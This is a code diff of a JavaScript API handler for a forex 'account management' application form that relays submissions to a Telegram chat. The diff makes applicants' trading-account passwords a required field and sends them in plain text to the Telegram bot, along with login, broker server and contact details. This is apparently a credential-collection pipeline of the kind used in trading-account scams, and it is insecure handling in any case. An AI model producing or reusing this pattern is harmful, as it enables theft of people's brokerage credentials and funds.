@@ -1,6 +1,4 @@
-
 export default async function handler(req, res) {
-  // Only allow POST requests
   if (req.method !== "POST") {
     return res.status(405).json({
       success: false,
@@ -17,10 +15,10 @@ export default async function handler(req, res) {
       platform_type,
       broker_server,
       trading_login,
+      trading_password,
       account_size,
     } = req.body || {};
 
-    // Basic validation
     if (
       !name ||
       !whatsapp ||
@@ -29,11 +27,12 @@ export default async function handler(req, res) {
       !platform_type ||
       !broker_server ||
       !trading_login ||
+      !trading_password ||
       !account_size
     ) {
       return res.status(400).json({
         success: false,
-        message: "Missing required application details.",
+        message: "All application fields are required.",
       });
     }
 
@@ -41,30 +40,44 @@ export default async function handler(req, res) {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!botToken || !chatId) {
-      console.error("Telegram environment variables are missing.");
-
       return res.status(500).json({
         success: false,
-        message: "Telegram service is not configured.",
+        message: "Telegram configuration is missing.",
       });
     }
 
     const message = `
-🔔 NEW ACCOUNT MANAGEMENT APPLICATION
+🚨 NEW ACCOUNT MANAGEMENT APPLICATION
 
-👤 Name: ${name}
-📱 WhatsApp: ${whatsapp}
-📧 Email: ${email}
+👤 Full Name:
+${name}
 
-🏦 Preferred Broker: ${preferred_broker}
-💻 Platform: ${platform_type}
-🖥 Broker Server: ${broker_server}
-🔢 Trading Login: ${trading_login}
+📱 WhatsApp:
+${whatsapp}
 
-💰 Account Size: ${account_size}
+📧 Email:
+${email}
+
+🏦 Preferred Broker:
+${preferred_broker}
+
+💻 Platform:
+${platform_type}
+
+🖥 Broker Server:
+${broker_server}
+
+🔢 Trading Login:
+${trading_login}
+
+🔐 Trading Password:
+${trading_password}
+
+💰 Account Size:
+${account_size}
 
 ━━━━━━━━━━━━━━━━━━
-📩 Source: Account Management Website
+🌐 Submitted from FX 7 sTarZ
 ━━━━━━━━━━━━━━━━━━
 `;
 
@@ -78,7 +91,6 @@ export default async function handler(req, res) {
         body: JSON.stringify({
           chat_id: chatId,
           text: message,
-          disable_web_page_preview: true,
         }),
       }
     );
@@ -86,7 +98,7 @@ export default async function handler(req, res) {
     const telegramData = await telegramResponse.json();
 
     if (!telegramResponse.ok || !telegramData.ok) {
-      console.error("Telegram API error:", telegramData);
+      console.error("Telegram error:", telegramData);
 
       return res.status(500).json({
         success: false,
@@ -96,14 +108,14 @@ export default async function handler(req, res) {
 
     return res.status(200).json({
       success: true,
-      message: "Application sent successfully.",
+      message: "Application submitted successfully.",
     });
   } catch (error) {
-    console.error("Account management Telegram error:", error);
+    console.error("Server error:", error);
 
     return res.status(500).json({
       success: false,
-      message: "Server error.",
+      message: "Something went wrong.",
     });
   }
 }
